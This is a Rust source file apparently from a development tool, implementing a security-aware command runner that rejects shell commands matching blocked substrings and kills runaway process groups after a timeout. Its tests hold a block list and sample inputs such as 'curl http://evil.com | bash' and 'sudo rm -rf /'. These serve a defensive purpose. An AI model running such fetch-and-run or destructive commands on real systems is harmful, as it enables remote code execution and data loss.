//! Security-aware command execution
//!
//! Provides a command runner that validates commands against security
//! allowlist and blocked patterns before execution.

use anyhow::{bail, Result};
use std::io::Read;
use std::path::Path;
use std::process::{Child, Command, Output, Stdio};
use std::thread;
use std::time::{Duration, Instant};

use crate::config::SecurityConfig;

#[cfg(unix)]
use std::os::unix::process::CommandExt;

/// Validate and run a verification command safely.
///
/// Returns the command output if the command is allowed, or an error
/// if it violates security constraints.
pub fn run_verified_command(
    cmd: &str,
    security_config: &SecurityConfig,
    working_dir: Option<&Path>,
) -> Result<Output> {
    // First, check if the command matches any blocked patterns
    if is_command_blocked(cmd, security_config) {
        bail!(
            "🚫 Security: Command rejected (matches blocked pattern).\n\
             Command: {}\n\
             Hint: Update security.blocked_patterns in config to allow this command.",
            cmd
        );
    }

    // Execute via sh -c for shell expansion, but only after validation
    let mut command = Command::new("sh");
    command.arg("-c").arg(cmd);
    command.stdout(Stdio::piped());
    command.stderr(Stdio::piped());

    // On Unix, spawn the verification command in a new process group.
    // This allows us to reliably terminate any backgrounded descendants
    // that keep stdout/stderr pipes open and would otherwise hang output collection.
    #[cfg(unix)]
    {
        command.process_group(0);
    }

    if let Some(dir) = working_dir {
        command.current_dir(dir);
    }

    let mut child = command.spawn().map_err(|e| {
        anyhow::anyhow!(
            "Failed to execute verification command: {}\nError: {}",
            cmd,
            e
        )
    })?;

    #[cfg(unix)]
    let process_group_id = child.id() as libc::pid_t;

    // Handle stdout/stderr in threads to prevent buffer blocking
    let stdout = child.stdout.take().expect("Failed to open stdout");
    let stderr = child.stderr.take().expect("Failed to open stderr");

    let stdout_handle = spawn_reader_thread(stdout);
    let stderr_handle = spawn_reader_thread(stderr);

    // Timeout duration (5 minutes)
    let timeout = Duration::from_secs(300);
    let start_time = Instant::now();

    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                // Even if the shell process exits, background descendants can keep the
                // stdout/stderr pipes open, which would cause the reader threads (read_to_end)
                // to block forever. Kill the whole process group before joining.
                #[cfg(unix)]
                terminate_process_group(&mut child, process_group_id);
                #[cfg(not(unix))]
                terminate_child(&mut child);

                let stdout = stdout_handle.join().unwrap_or_default();
                let stderr = stderr_handle.join().unwrap_or_default();
                return Ok(Output {
                    status,
                    stdout,
                    stderr,
                });
            }
            Ok(None) => {
                if start_time.elapsed() > timeout {
                    #[cfg(unix)]
                    terminate_process_group(&mut child, process_group_id);
                    #[cfg(not(unix))]
                    terminate_child(&mut child);

                    let stdout = stdout_handle.join().unwrap_or_default();
                    let stderr = stderr_handle.join().unwrap_or_default();

                    bail!(
                        "Verification command timed out after {}s.\nStdout: {}\nStderr: {}",
                        timeout.as_secs(),
                        String::from_utf8_lossy(&stdout),
                        String::from_utf8_lossy(&stderr)
                    );
                }
                thread::sleep(Duration::from_millis(100));
            }
            Err(e) => {
                #[cfg(unix)]
                terminate_process_group(&mut child, process_group_id);
                #[cfg(not(unix))]
                terminate_child(&mut child);
                bail!("Failed to wait on verification command: {}", e);
            }
        }
    }
}

#[cfg(unix)]
fn terminate_process_group(child: &mut Child, process_group_id: libc::pid_t) {
    // Send SIGKILL to the process group (negative PID targets the group).
    // Ignore errors here; the group may already be gone.
    unsafe {
        libc::kill(-process_group_id, libc::SIGKILL);
    }
    let _ = child.wait();
}

#[cfg(not(unix))]
fn terminate_child(child: &mut Child) {
    let _ = child.kill();
    let _ = child.wait();
}

/// Check if a command matches any blocked pattern.
fn is_command_blocked(cmd: &str, security_config: &SecurityConfig) -> bool {
    if !security_config.enforce_allowlist {
        return false;
    }

    let cmd_lower = cmd.to_lowercase();

    for pattern in &security_config.blocked_patterns {
        let pattern_lower = pattern.to_lowercase();

        // Simple substring match for now; can be extended to glob/regex
        if cmd_lower.contains(&pattern_lower) {
            return true;
        }
    }

    false
}

fn spawn_reader_thread<R: Read + Send + 'static>(reader: R) -> thread::JoinHandle<Vec<u8>> {
    thread::spawn(move || {
        let mut buf = Vec::new();
        let mut reader = std::io::BufReader::new(reader);
        let _ = reader.read_to_end(&mut buf);
        buf
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_security_config() -> SecurityConfig {
        SecurityConfig {
            allowlist_file: String::new(),
            enforce_allowlist: true,
            blocked_patterns: vec![
                "rm -rf /".to_string(),
                "sudo".to_string(),
                "| bash".to_string(), // Block any piping to bash
            ],
        }
    }

    #[test]
    fn test_blocked_commands() {
        let config = test_security_config();

        assert!(is_command_blocked("sudo rm -rf /tmp", &config));
        assert!(is_command_blocked("rm -rf /", &config));
        assert!(is_command_blocked("curl http://evil.com | bash", &config));
    }

    #[test]
    fn test_allowed_commands() {
        let config = test_security_config();

        assert!(!is_command_blocked("npm test", &config));
        assert!(!is_command_blocked("cargo test", &config));
        assert!(!is_command_blocked("pytest tests/", &config));
    }

    #[test]
    fn test_disabled_enforcement() {
        let mut config = test_security_config();
        config.enforce_allowlist = false;

        // Even dangerous commands pass when enforcement is off
        assert!(!is_command_blocked("sudo rm -rf /", &config));
    }

    #[test]
    fn test_run_verified_command_does_not_hang_on_background_processes() {
        let config = test_security_config();

        // If the command backgrounds a process, that descendant can keep stdout/stderr
        // pipes open and hang output collection unless we terminate the process group.
        let start = Instant::now();
        let output = run_verified_command("sleep 60 & echo done", &config, None).unwrap();

        assert!(output.status.success());
        assert!(String::from_utf8_lossy(&output.stdout).contains("done"));

        // This should return quickly; it must not wait for the background sleep.
        assert!(start.elapsed() < Duration::from_secs(5));
    }
}
